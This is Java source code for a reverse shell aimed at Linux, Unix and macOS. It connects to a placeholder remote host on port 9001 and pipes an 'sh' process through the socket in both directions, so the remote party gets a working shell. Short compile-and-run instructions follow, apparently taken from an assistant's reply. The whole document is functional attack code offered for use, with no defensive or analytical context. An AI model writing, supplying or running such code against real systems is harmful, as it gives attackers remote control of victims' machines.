// Linux/Unix/macOS
import java.io.*;
import java.net.Socket;

public class ReverseShell {
    public static void main(String[] args) {
        try {
            // Establish connection to the remote host
            Socket socket = new Socket("IP_ADDRESS", 9001);

            // Start shell process
            Process process = new ProcessBuilder("sh").redirectErrorStream(true).start();

            // Thread for reading from socket and writing to process stdin
            Thread s2pThread = new Thread(() -> {
                try (InputStream socketInput = socket.getInputStream();
                     OutputStream processOutput = process.getOutputStream()) {
                    byte[] buffer = new byte[1024];
                    int bytesRead;
                    while ((bytesRead = socketInput.read(buffer)) != -1) {
                        processOutput.write(buffer, 0, bytesRead);
                        processOutput.flush();
                    }
                } catch (IOException e) {
                    // Connection closed or error occurred
                }
            });
            s2pThread.setDaemon(true);
            s2pThread.start();

            // Thread for reading from process stdout and writing to socket
            Thread p2sThread = new Thread(() -> {
                try (InputStream processInput = process.getInputStream();
                     OutputStream socketOutput = socket.getOutputStream()) {
                    int byteRead;
                    while ((byteRead = processInput.read()) != -1) {
                        socketOutput.write(byteRead);
                        socketOutput.flush();
                    }
                } catch (IOException e) {
                    // Connection closed or error occurred
                }
            });
            p2sThread.setDaemon(true);
            p2sThread.start();

            // Wait for process to complete
            process.waitFor();
            socket.close();
        } catch (IOException | InterruptedException e) {
            // Handle exceptions (e.g., connection error, keyboard interrupt)
            System.exit(1);
        }
    }
}
```

"To compile and run this code, you'll need Java Development Kit (JDK) installed. Here are the basic commands:

javac ReverseShell.java
java ReverseShell
"